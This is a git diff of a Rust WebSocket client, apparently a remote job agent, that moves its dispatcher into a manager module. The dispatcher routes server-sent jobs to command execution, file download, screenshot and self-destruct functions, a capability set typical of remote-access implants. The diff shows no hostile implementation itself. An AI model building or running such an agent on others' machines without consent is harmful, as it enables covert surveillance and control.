@@ -18,15 +18,10 @@ use tokio_tungstenite::{
     WebSocketStream,
 };
 
-use common::api::{Job, JobOutput, JobResult, JobType};
+use common::api::{Job, JobResult};
 use common::errors::JobErrors::TimeOut;
-use executors::{
-    command::execute_command,
-    download::download_file,
-    playsound::play_sound,
-    screenshot::screenshot,
-    selfdestruct::selfdestruct,
-};
+
+use crate::manager;
 
 type Handle = JoinHandle<()>;
 type MutexSender = Arc<Mutex<SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>>>;
@@ -66,7 +61,7 @@ async fn receive(receiver: &mut Receiver) -> Result<Job, TungstenError> {
 }
 
 async fn execute(mut sender_arc: MutexSender, job: Job) -> Result<(), TungstenError> {
-    let output = pick_executor(&job.job_type).await;
+    let output = manager::pick_executor(&job.job_type).await;
 
     let result = JobResult {
         job_output: Ok(output),
@@ -83,15 +78,6 @@ async fn send(sender: &mut MutexSender, job_result: JobResult) -> Result<(), Tun
     Ok(())
 }
 
-async fn pick_executor(job_type: &JobType) -> JobOutput {
-    match job_type {
-        JobType::Command(p) => { execute_command(p).await }
-        JobType::DownloadFile(p) => { download_file(p).await }
-        JobType::PlaySound(p) => { play_sound(p).await }
-        JobType::ScreenShot => { screenshot().await }
-        JobType::SelfDestruct => { selfdestruct().await }
-    }
-}
 
 async fn process_message(msg: Message) -> Result<String, TungstenError> {
     match msg {
@@ -112,7 +98,7 @@ async fn execute_timeout(job: Job, mut sender: MutexSender) {
     match timeout(job.timeout, execute(sender.clone(), job)).await {
         Ok(e) => {
             match e {
-                Ok(_) => { }
+                Ok(_) => {}
                 Err(e) => { println!("{:#?}", e) }
             }
         }
